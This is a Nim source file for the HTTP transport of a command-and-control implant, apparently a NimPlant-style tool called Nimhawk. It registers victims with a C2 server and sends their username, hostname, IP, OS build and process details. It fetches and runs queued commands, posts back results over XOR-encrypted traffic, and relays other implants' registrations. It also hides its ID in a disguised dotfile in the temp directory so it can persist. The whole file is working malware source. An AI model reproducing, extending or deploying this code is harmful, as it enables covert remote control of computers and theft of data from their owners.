# Use puppy for all architectures (ARM64 and Intel x64)
import base64, json, puppy, sequtils
from strutils import split, toLowerAscii, replace, strip, startsWith, toHex
from os import parseCmdLine

import ../util/[crypto, strenc, sysinfo]
import ../config/configParser
import tables, os, times, random

# Forward declarations for persistence functions
proc storeImplantID*(id: string)
proc getStoredImplantID*(): string  
proc removeStoredImplantID()

# Debug function to analyze key decoding
proc debugKeyDecoding(keyStr: string, keyBytes: string, xorKey: int): void =
    when defined verbose:
        echo obf("DEBUG: Received key (base64): ") & keyStr
        echo obf("DEBUG: Decoded key length: ") & $keyBytes.len
        echo obf("DEBUG: First 10 bytes as hex: ")
        for i in 0..<(if keyBytes.len < 10: keyBytes.len else: 10):
            echo obf("  [") & $i & obf("]: 0x") & keyBytes[i].byte.toHex()
        echo obf("DEBUG: Attempting XOR with INITIAL_XOR_KEY: ") & $xorKey

# Define the object with listener properties
const INITIAL_XOR_KEY {.intdefine.}: int = 459457925

# Use puppy Response for all architectures
type
    Response* = puppy.Response

type
    Listener* = object
        id* : string
        initialized* : bool
        registered* : bool
        listenerType* : string
        listenerHost* : string
        implantCallbackIp* : string
        listenerPort* : string
        registerPath* : string
        reconnectPath* : string
        sleepTime* : int
        sleepJitter* : float
        killDate* : string
        taskPath* : string
        resultPath* : string
        userAgent* : string
        UNIQUE_XOR_KEY* : string
        httpAllowCommunicationKey* : string



# HTTP request function using puppy for all architectures
proc doRequest(li : Listener, path : string, postKey : string = "", postValue : string = "", verb : string = "get") : puppy.Response =
    try:
            when defined verbose:
                echo obf("DEBUG: doRequest() - Using puppy")
                echo obf("DEBUG: doRequest() - listenerType: ") & li.listenerType
                echo obf("DEBUG: doRequest() - listenerHost: ") & li.listenerHost
                echo obf("DEBUG: doRequest() - implantCallbackIp: ") & li.implantCallbackIp
                echo obf("DEBUG: doRequest() - listenerPort: ") & li.listenerPort
                echo obf("DEBUG: doRequest() - path: ") & path
            
            # Determine target: Either "TYPE://HOST:PORT" or "TYPE://HOSTNAME"
            var target : string = toLowerAscii(li.listenerType) & "://"
            if li.listenerHost != "":
                target = target & li.listenerHost
            else:
                target = target & li.implantCallbackIp & ":" & li.listenerPort
            target = target & path

            when defined verbose:
                echo obf("DEBUG: doRequest() - target URL: ") & target

            # Get the workspace_uuid from the configuration
            let config = parseConfig()
            var workspace_uuid = ""
            let workspace_key = obf("workspace_uuid")
            
            try:
                for k, v in pairs(config):
                    if k == workspace_key:
                        workspace_uuid = v
                        break
            except:
                when defined verbose:
                    echo obf("DEBUG: Error accessing workspace_uuid in config")

            when defined verbose:
                echo obf("DEBUG: doRequest() - workspace_uuid: ") & workspace_uuid

            # GET request
            if (postKey == "" or postValue == "" and path != li.reconnectPath):
                when defined verbose:
                    echo obf("DEBUG: doRequest() - Preparing GET request")
                
                var headers: seq[Header]

                # Only send ID header once listener is registered
                if li.id != "":
                    headers = @[
                            Header(key: "X-Request-ID", value: li.id),
                            Header(key: "User-Agent", value: li.userAgent),
                            Header(key: "Content-Type", value: "application/json"),
                            Header(key: "X-Correlation-ID", value: li.httpAllowCommunicationKey),    
                        ]
                else:
                    headers = @[
                            Header(key: "User-Agent", value: li.userAgent),
                            Header(key: "X-Correlation-ID", value: li.httpAllowCommunicationKey),
                            Header(key: "Content-Type", value: "application/json")
                        ]
                
                # Add workspace_uuid header if provided
                if workspace_uuid != "":
                    headers.add(Header(key: "X-Robots-Tag", value: workspace_uuid))
                    
                    when defined verbose:
                        echo obf("DEBUG: Added workspace_uuid to header: ") & workspace_uuid

                let parsedUrl = parseUrl(target)
                let req = Request(
                    url: parsedUrl,
                    verb: verb,
                    headers: headers,
                    allowAnyHttpsCertificate: true,
                    )

                when defined verbose:
                    echo obf("DEBUG: doRequest() - About to fetch()")
                    echo obf("DEBUG: doRequest() - Request details:")
                    echo obf("  URL: ") & $req.url
                    echo obf("  Verb: ") & req.verb
                    echo obf("  Headers count: ") & $req.headers.len

                let fetchResult = fetch(req)
                
                when defined verbose:
                    echo obf("DEBUG: doRequest() - fetch() completed successfully")
                    echo obf("DEBUG: doRequest() - Response code: ") & $fetchResult.code
                    
                return fetchResult

            # POST request
            else:
                when defined verbose:
                    echo obf("DEBUG: doRequest() - Preparing POST request")
                
                var post_body = "{\"" & postKey & "\":\"" & postValue & "\"}"
                if verb == "options":
                    post_body = ""
                
                var headers = @[
                        Header(key: "X-Request-ID", value: li.id),
                        Header(key: "User-Agent", value: li.userAgent),
                        Header(key: "Content-Type", value: "application/json"),
                        Header(key: "X-Correlation-ID", value: li.httpAllowCommunicationKey)
                    ]
                
                # Add workspace_uuid header if provided
                if workspace_uuid != "":
                    headers.add(Header(key: "X-Robots-Tag", value: workspace_uuid))
                    
                    when defined verbose:
                        echo obf("DEBUG: Added workspace_uuid to header: ") & workspace_uuid
                
                let parsedUrl = parseUrl(target)
                let req = Request(
                    url: parsedUrl,
                    verb: verb,
                    headers: headers,
                    allowAnyHttpsCertificate: true,
                    body: post_body
                    )
                
                when defined verbose:
                    echo obf("DEBUG: doRequest() - About to fetch() for POST")

                let fetchResult = fetch(req)
                
                when defined verbose:
                    echo obf("DEBUG: doRequest() - POST fetch() completed successfully")
                    echo obf("DEBUG: doRequest() - Response code: ") & $fetchResult.code
                    
                return fetchResult

    except Exception as e:
        when defined verbose:
            echo obf("DEBUG: doRequest() - Exception caught: ") & e.msg
            echo obf("DEBUG: doRequest() - Exception type: ") & $e.name
        
        # Return error response (puppy only, no fallback)
        var errResponse = puppy.Response()
        errResponse.code = 500
        return errResponse

# Init Implant ID and cryptographic key via GET request to the registration path
# XOR-decrypt transmitted key with static value for initial exchange
proc init*(li: var Listener) : void =
    # Get the workspace_uuid from the configuration for verbose mode
    let config = parseConfig()
    var workspace_uuid = ""
    let workspace_key = obf("workspace_uuid")
    
    # Try to access the workspace_uuid value in the configuration
    try:
        for k, v in pairs(config):
            if k == workspace_key:
                workspace_uuid = v
                break
    except:
        # If there is an error, leave workspace_uuid as an empty string
        when defined verbose:
            echo obf("DEBUG: Error accessing workspace_uuid in config")
    
    # Log the workspace_uuid if in verbose mode
    when defined verbose:
        if workspace_uuid != "":
            echo obf("DEBUG: Using workspace_uuid: ") & workspace_uuid
    
    # Register with the server
    when defined verbose:
        echo obf("DEBUG: Attempting to connect to ") & toLowerAscii(li.listenerType) & "://" & 
             (if li.listenerHost != "": li.listenerHost else: li.implantCallbackIp & ":" & li.listenerPort) & 
             li.registerPath

    var res = doRequest(li, li.registerPath)
    
    when defined verbose:
        echo obf("DEBUG: Response code: ") & $res.code
        if res.code != 200:
            echo obf("DEBUG: Response body: ") & res.body
        
    if res.code == 200:
        li.id = parseJson(res.body)["id"].getStr()
        
        # Debug key decoding process
        let keyStr = parseJson(res.body)["k"].getStr()
        let keyBytesRaw = base64.decode(keyStr)
        debugKeyDecoding(keyStr, keyBytesRaw, INITIAL_XOR_KEY)
        
        # Convert base64 decoded string to byte sequence safely
        let keyByteSeq = convertToByteSeq(keyBytesRaw)
        li.UNIQUE_XOR_KEY = xorBytes(keyByteSeq, INITIAL_XOR_KEY)
        li.initialized = true
        
        when defined verbose:
            echo obf("DEBUG: ID stored in registry: ") & li.id
    else:
        li.initialized = false

# Initial registration function, including key init
proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, pname : string, riskyMode : bool, relayRole : string = "STANDARD") : void =
    # Once key is known, send a second request to register implant with initial info
    when defined verbose:
        echo obf("DEBUG: Sending registration request with ID: ") & li.id
        echo obf("DEBUG: Relay role: ") & relayRole
    
    var data = %*
        [
            {
                "i": ipAddrInt,
                "u": username,
                "h": hostname,
                "o": osBuild,
                "p": pid,
                "P": pname,
                "r": riskyMode,
                "R": relayRole
            }
        ]
    var dataStr = ($data)[1..^2]
    
    when defined verbose:
        echo obf("DEBUG: Data to send (unencrypted): ") & dataStr
    
    let encryptedData = encryptData(dataStr, li.UNIQUE_XOR_KEY)
    
    when defined verbose:
        echo obf("DEBUG: Encrypted data (first 20 characters): ") & 
             (if encryptedData.len > 20: encryptedData[0..19] else: encryptedData) & "..."
    
    let res = doRequest(li, li.registerPath, "data", encryptedData, "post")
    
    when defined verbose:
        echo obf("DEBUG: Response code: ") & $res.code
        echo obf("DEBUG: Response body: ") & 
             (if res.body.len > 0: res.body else: "<empty>")
    
    if (res.code != 200):
        # Error at this point means XOR key mismatch, abort
        li.registered = false
        
        when defined verbose:
            echo obf("DEBUG: ERROR - Registration failed. Possible cause: XOR key mismatch.")
            echo obf("DEBUG: Headers sent:")
            echo obf("  X-Request-ID: ") & li.id
            echo obf("  User-Agent: ") & li.userAgent
            echo obf("  X-Correlation-ID: ") & li.httpAllowCommunicationKey
    else:
        li.registered = true
        
        when defined verbose:
            echo obf("DEBUG: Registration successful. Implant now registered with ID: ") & li.id

# Relay forwarding registration function - returns assigned ID and encryption key
proc postRelayRegisterRequest*(li : var Listener, relayClientID: string, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, pname : string, riskyMode : bool, relayRole : string = "RELAY_CLIENT") : (string, string) =
    # Forward registration for relay client using the relay client's ID
    when defined verbose:
        echo obf("DEBUG: Forwarding relay registration with relay client ID: ") & relayClientID
        echo obf("DEBUG: Relay role: ") & relayRole
    
    var data = %*
        [
            {
                "i": ipAddrInt,
                "u": username,
                "h": hostname,
                "o": osBuild,
                "p": pid,
                "P": pname,
                "r": riskyMode,
                "R": relayRole
            }
        ]
    var dataStr = ($data)[1..^2]
    
    when defined verbose:
        echo obf("DEBUG: Relay forwarding data (unencrypted): ") & dataStr
    
    # Create a temporary listener with the relay client's ID for this request
    var tempListener = li
    tempListener.id = relayClientID
    
    # First, we need to initialize the relay client in the C2 (GET request)
    when defined verbose:
        echo obf("DEBUG: Initializing relay client in C2: ") & relayClientID
    
    var initRes = doRequest(tempListener, li.registerPath)
    
    when defined verbose:
        echo obf("DEBUG: Relay client init response code: ") & $initRes.code
        if initRes.code != 200:
            echo obf("DEBUG: Relay client init response body: ") & initRes.body
    
    if initRes.code == 200:
        # Parse the response to get the encryption key for this relay client
        let responseJson = parseJson(initRes.body)
        let clientId = responseJson["id"].getStr()
        let keyStr = responseJson["k"].getStr()
        
        when defined verbose:
            echo obf("DEBUG: Relay client got ID from C2: ") & clientId
            echo obf("DEBUG: Relay client got key from C2 (length: ") & $keyStr.len & ")"
            echo obf("DEBUG: 🚨 C2 ID ASSIGNMENT DEBUG:")
            echo obf("DEBUG: 🚨 - Original request ID: ") & relayClientID
            echo obf("DEBUG: 🚨 - C2 assigned ID: ") & clientId
            echo obf("DEBUG: 🚨 - Request IP: ") & ipAddrInt
            echo obf("DEBUG: 🚨 - Request hostname: ") & hostname
            echo obf("DEBUG: 🚨 - Relay role: ") & relayRole
            echo obf("DEBUG: 🚨 - C2 full response: ") & initRes.body
          
        # Decode and XOR the key
        let keyBytesRaw = base64.decode(keyStr)
        let keyByteSeq = convertToByteSeq(keyBytesRaw)
        let clientKey = xorBytes(keyByteSeq, INITIAL_XOR_KEY)
        
        # Now encrypt the registration data with the relay client's key
        let encryptedData = encryptData(dataStr, clientKey)
        
        when defined verbose:
            echo obf("DEBUG: Relay client data encrypted with client key")
        
        # Send the POST registration with the relay client's ID and key
        tempListener.id = clientId
        let res = doRequest(tempListener, li.registerPath, "data", encryptedData, "post")
        
        when defined verbose:
            echo obf("DEBUG: Relay forwarding response code: ") & $res.code
            echo obf("DEBUG: Relay forwarding response body: ") & 
                 (if res.body.len > 0: res.body else: "<empty>")
        
        if res.code == 200:
            when defined verbose:
                echo obf("DEBUG: Relay client registration forwarded successfully with ID: ") & clientId
                echo obf("DEBUG: ✅ RELAY CLIENT REGISTERED IN C2 WITH FINAL ID: ") & clientId
                echo obf("DEBUG: Original relay client ID: ") & relayClientID & obf(" -> C2 assigned ID: ") & clientId
            return (clientId, clientKey)  # Return the assigned ID and encryption key
        else:
            when defined verbose:
                echo obf("DEBUG: ERROR - Relay client registration failed")
            return ("", "")  # Return empty strings on failure
    else:
        when defined verbose:
            echo obf("DEBUG: ERROR - Failed to initialize relay client in C2")
        return ("", "")  # Return empty strings on failure

type
  Command = object
    guid: string
    command: string
    args: seq[string]

# Watch for queued commands via GET request to the task path
proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
    when defined verbose:
        echo obf("DEBUG: getQueuedCommand() called for implant ID: ") & li.id
        echo obf("DEBUG: getQueuedCommand() request target: ") & li.taskPath
        echo obf("DEBUG: getQueuedCommand() full URL will be: ") & toLowerAscii(li.listenerType) & "://" & 
             (if li.listenerHost != "": li.listenerHost else: li.implantCallbackIp & ":" & li.listenerPort) & 
             li.taskPath
    
    var 
        res = doRequest(li, li.taskPath)
        cmdGuid : string
        cmd : string
        args : seq[string]

    when defined verbose:
        echo obf("DEBUG: getQueuedCommand() response code: ") & $res.code
        echo obf("DEBUG: getQueuedCommand() response body: ") & 
             (if res.body.len > 200: res.body[0..199] & "..." else: res.body)

    # A connection error occurred, likely team server has gone down or restart
    if res.code != 200:
        cmd = obf("NIMPLANT_CONNECTION_ERROR")

        when defined verbose:
            echo obf("DEBUG: Connection error, got status code: "), res.code

    # Otherwise, parse task and arguments (if any)
    else:
        try:
            when defined verbose:
                echo obf("DEBUG: getQueuedCommand() attempting to parse response...")
                echo obf("DEBUG: getQueuedCommand() response body for parsing: ") & res.body
            
            # Parse the response JSON first to see what keys are available
            let responseJson = parseJson(res.body)
            
            when defined verbose:
                echo obf("DEBUG: getQueuedCommand() parsed JSON keys: ") & $responseJson.keys().toSeq()
            
            # Check if the response has the expected "t" key for encrypted task data
            if responseJson.hasKey("t"):
                # Attempt to parse task (parseJson() needs string literal... sigh)
                var responseData = decryptData(responseJson["t"].getStr(), li.UNIQUE_XOR_KEY) #.replace("\'", "\\\"")
                
                when defined verbose:
                    echo obf("DEBUG: getQueuedCommand() decrypted response data: ") & responseData
                
                var parsedResponseData = parseJson(responseData)
                
                when defined verbose:
                    echo obf("DEBUG: getQueuedCommand() parsed JSON: ") & $parsedResponseData
                
                var jsonData = to(parsedResponseData, Command)

                # Get the task and task GUID from the response
                cmdGuid = jsonData.guid
                cmd = jsonData.command
                args = jsonData.args
                
                when defined verbose:
                    echo obf("DEBUG: getQueuedCommand() extracted - GUID: ") & cmdGuid
                    echo obf("DEBUG: getQueuedCommand() extracted - Command: ") & cmd
                    echo obf("DEBUG: getQueuedCommand() extracted - Args: ") & $args
            else:
                # No "t" key found - likely no commands available
                when defined verbose:
                    echo obf("DEBUG: getQueuedCommand() no 't' key found - no commands available")
                    echo obf("DEBUG: getQueuedCommand() response JSON: ") & $responseJson
                
                cmdGuid = ""
                cmd = ""
                args = @[]
        except Exception as e:
            # No task has been returned
            when defined verbose:
                echo obf("DEBUG: getQueuedCommand() no task returned or parse error: ") & e.msg
            
            cmdGuid = ""
            cmd = ""

    when defined verbose:
        echo obf("DEBUG: getQueuedCommand() final result - GUID: ") & cmdGuid
        echo obf("DEBUG: getQueuedCommand() final result - Command: ") & cmd
        echo obf("DEBUG: getQueuedCommand() final result - Args: ") & $args

    result = (cmdGuid, cmd, args)

# Return command results via POST request to the result path
proc postCommandResults*(li : Listener, cmdGuid : string, output : string) : void =
    var data = obf("{\"guid\": \"") & cmdGuid & obf("\", \"result\":\"") & base64.encode(output) & obf("\"}")
    discard doRequest(li, li.resultPath, "data", encryptData(data, li.UNIQUE_XOR_KEY), "post")

# postTopologyUpdate removed - using distributed chain relationships system

# Announce that the kill timer has expired
proc killSelf*(li : Listener) : void =
    if li.initialized:
        postCommandResults(li, "", obf("NIMPLANT_KILL_TIMER_EXPIRED"))
        
        # Clean up registry entry
        when defined verbose:
            echo obf("DEBUG: Kill timer expired, removing implant ID from registry")
        removeStoredImplantID()
        when defined verbose:
            echo obf("DEBUG: Successfully removed implant ID from storage on self-kill")


proc reconnect*(li: var Listener) : void =
    # Check if a value exists in the registry and retrieve it
    let storedId = getStoredImplantID()
    
    if storedId != "":
        # Assign the deobfuscated ID to the listener to include it in the request
        li.id = storedId
        
        # Send OPTIONS request to reconnectPath with the stored ID
        when defined verbose:
            echo "DEBUG: Attempting to reconnect with ID retrieved from registry: " & li.id
        
        # Use doRequest with the OPTIONS verb
        var res = doRequest(li, li.reconnectPath, "", "", "options")
        
        when defined verbose:
            echo obf("DEBUG: Reconnection response. Code: ") & $res.code
        
        # Check for inactive implant response (410 Gone)
        if res.code == 410:
            when defined verbose:
                echo obf("DEBUG: Server indicates implant is inactive, will register as new implant")
            
            # Clear implant data to force new registration
            li.id = ""
            li.initialized = false
            li.registered = false
            
            # Remove the stored ID from registry since it's no longer valid
            removeStoredImplantID()
            
            when defined verbose:
                echo obf("DEBUG: Cleared implant data and registry entry for new registration")
            
            return
        
        # If reconnection is successful, update data and finish
        if res.code == 200:
            # Here we could process any server response
            # such as a new cryptographic key if sent
            if res.body.len > 0:
                try:
                    # Debug key decoding process
                    let keyStr = parseJson(res.body)["k"].getStr()
                    let keyBytesRaw = base64.decode(keyStr)
                    debugKeyDecoding(keyStr, keyBytesRaw, INITIAL_XOR_KEY)
                    
                    # Convert base64 decoded string to byte sequence safely
                    let keyByteSeq = convertToByteSeq(keyBytesRaw)
                    li.UNIQUE_XOR_KEY = xorBytes(keyByteSeq, INITIAL_XOR_KEY)
                    when defined verbose:
                        echo obf("DEBUG: New cryptographic key obtained from server")
                except:
                    when defined verbose:
                        echo obf("DEBUG: Could not obtain new cryptographic key")
            
            li.initialized = true
            
            # IMPORTANT: Explicitly perform a check-in after reconnecting
            when defined verbose:
                echo obf("DEBUG: Performing initial check-in after reconnection")
            
            # Try to get pending tasks immediately (check-in)
            let (cmdGuid, cmd, args) = getQueuedCommand(li)
            
            # Mark as registered after successful reconnection
            li.registered = true
            
            when defined verbose:
                echo obf("DEBUG: Successful reconnection with stored ID")
                echo obf("DEBUG: Check-in complete, implant ready to receive commands")
            
            return
        else:
            # If reconnection fails, clear the ID to get a new one
            li.id = ""
            li.initialized = false
            li.registered = false
            when defined verbose:
                echo obf("DEBUG: Reconnection failed, will request a new ID")

# Cross-platform persistence functions implementation
randomize()

proc validateNimhawkPattern(line: string): bool =
    if line.len < 32:
        return false
    let colonParts = line.split(":")
    if colonParts.len != 2:
        return false
    let patternPart = colonParts[0]
    let idPart = colonParts[1]
    if idPart.len == 0:
        return false
    let parts = patternPart.split("-")
    if parts.len != 5:
        return false
    try:
        if parts[0].len != 4:
            return false
        for c in parts[0]:
            if not (c >= '0' and c <= '9'):
                return false
        if parts[1].len != 4:
            return false
        for c in parts[1]:
            if not (c >= 'a' and c <= 'z'):
                return false
        if parts[2].len != 5:
            return false
        for c in parts[2]:
            if not (c >= 'a' and c <= 'z'):
                return false
        if parts[3].len != 4:
            return false
        for c in parts[3]:
            if not (c >= '0' and c <= '9'):
                return false
        if parts[4].len != 7:
            return false
        for c in parts[4]:
            if not (c >= 'A' and c <= 'Z'):
                return false
        return true
    except:
        return false

proc generateNimhawkPattern(): string =
    var pattern = ""
    # Generate 4 digits (0-9)
    for i in 0..3:
        pattern.add(char(ord('0') + rand(10)))
    pattern.add("-")
    # Generate 4 lowercase letters (a-z)
    for i in 0..3:
        pattern.add(char(ord('a') + rand(25)))
    pattern.add("-")
    # Generate 5 lowercase letters (a-z)
    for i in 0..4:
        pattern.add(char(ord('a') + rand(25)))
    pattern.add("-")
    # Generate 4 digits (0-9)
    for i in 0..3:
        pattern.add(char(ord('0') + rand(10)))
    pattern.add("-")
    # Generate 7 uppercase letters (A-Z)
    for i in 0..6:
        pattern.add(char(ord('A') + rand(25)))
    return pattern

proc getTempDir(): string =
    when defined(windows):
        return getEnv("TEMP", "C:\\temp")
    else:
        return "/tmp"

proc generateRandomFilename(): string =
    let nameLen = rand(8..16)
    result = "."
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    for i in 0..<nameLen:
        result.add(chars[rand(chars.len - 1)])

proc findNimhawkFile(): string =
    try:
        let tempDir = getTempDir()
        for kind, path in walkDir(tempDir):
            if kind == pcFile:
                let filename = extractFilename(path)
                if filename.startsWith(".") and filename.len > 1:
                    try:
                        let content = readFile(path).strip()
                        if validateNimhawkPattern(content):
                            return path
                    except:
                        continue
    except:
        discard
    return ""

proc createPersistenceFile(): string =
    let tempDir = getTempDir()
    var attempts = 0
    while attempts < 10:
        let filename = generateRandomFilename()
        let fullPath = joinPath(tempDir, filename)
        if not fileExists(fullPath):
            return fullPath
        inc attempts
    let fallbackName = "." & $getTime().toUnix()
    return joinPath(tempDir, fallbackName)

proc storeImplantID*(id: string) =
    try:
        let existingFile = findNimhawkFile()
        if existingFile != "":
            try:
                removeFile(existingFile)
            except:
                discard
        let persistPath = createPersistenceFile()
        let obfuscatedId = xorString(id, INITIAL_XOR_KEY)
        let encodedId = base64.encode(obfuscatedId)
        let pattern = generateNimhawkPattern()
        let content = pattern & ":" & encodedId
        writeFile(persistPath, content)
    except:
        discard

proc getStoredImplantID*(): string =
    try:
        let persistPath = findNimhawkFile()
        if persistPath == "":
            return ""
        let content = readFile(persistPath).strip()
        if not validateNimhawkPattern(content):
            return ""
        let colonParts = content.split(":")
        if colonParts.len != 2:
            return ""
        let encodedId = colonParts[1]
        let obfuscatedId = base64.decode(encodedId)
        let id = xorString(obfuscatedId, INITIAL_XOR_KEY)
        return id
    except:
        return ""

proc removeStoredImplantID() =
    try:
        let persistPath = findNimhawkFile()
        if persistPath != "" and fileExists(persistPath):
            removeFile(persistPath)
    except:
        discard

# Enhanced chain info reporting function for distributed relay system
proc postChainInfo*(listener: Listener, myGuid: string, parentGuid: string = "", myRole: string = "STANDARD", listeningPort: int = 0) =
    try:
        when defined debug:
            echo "[DEBUG] 📡 HTTP: === SENDING CHAIN INFO TO C2 ==="
            echo "[DEBUG] 📡 HTTP: - Implant GUID: " & myGuid
            echo "[DEBUG] 📡 HTTP: - Parent GUID: " & (if parentGuid == "": "NULL (Direct C2)" else: parentGuid)
            echo "[DEBUG] 📡 HTTP: - Role: " & myRole
            echo "[DEBUG] 📡 HTTP: - Listening Port: " & $listeningPort
        
        # Get system information for comprehensive chain data
        let hostname = getSysHostname()
        let username = getUsername()
        let internalIP = getLocalIP()
        let osInfo = getOSInfo()
        let processName = getCurrentProcessName()
        let pid = getCurrentPID()
        
        # Enhanced chain data with system information
        let chainData = %*{
            "type": "chain_info",
            "nimplant_guid": myGuid,
            "parent_guid": if parentGuid == "": newJNull() else: %parentGuid,
            "my_role": myRole,
            "listening_port": listeningPort,
            "timestamp": epochTime().int64,
            # Enhanced system information
            "system_info": {
                "hostname": hostname,
                "username": username,
                "internal_ip": internalIP,
                "os_build": osInfo,
                "process_name": processName,
                "pid": pid
            },
            # Connection health information
            "connection_health": {
                "active": listener.registered,
                "last_checkin": epochTime().int64,
                "connection_type": if parentGuid == "": "DIRECT_C2" else: "RELAYED"
            }
        }
        
        when defined debug:
            echo "[DEBUG] 📡 HTTP: Enhanced chain data: " & $chainData
            echo "[DEBUG] 📡 HTTP: - Encrypting with UNIQUE key..."
        
        # Encrypt chain data using the same pattern as other endpoints
        let encryptedData = encryptData($chainData, listener.UNIQUE_XOR_KEY)
        
        when defined debug:
            echo "[DEBUG] 📡 HTTP: - Encrypted data length: " & $encryptedData.len
            echo "[DEBUG] 📡 HTTP: - Sending POST request to /chain endpoint..."
        
        let response = doRequest(listener, "/chain", "data", encryptedData, "post")
        
        when defined debug:
            echo "[DEBUG] 📡 HTTP: - Response code: " & $response.code
            if response.body != "":
                echo "[DEBUG] 📡 HTTP: - C2 response: " & response.body
            else:
                echo "[DEBUG] 📡 HTTP: - Chain info sent successfully"
            echo "[DEBUG] 📡 HTTP: === END CHAIN INFO SEND ==="
                
    except Exception as e:
        when defined debug:
            echo "[DEBUG] 📡 HTTP: ❌ Error sending chain info: " & e.msg
            echo "[DEBUG] 📡 HTTP: - Exception type: " & $type(e).name
            echo "[DEBUG] 📡 HTTP: === END CHAIN INFO SEND (ERROR) ==="

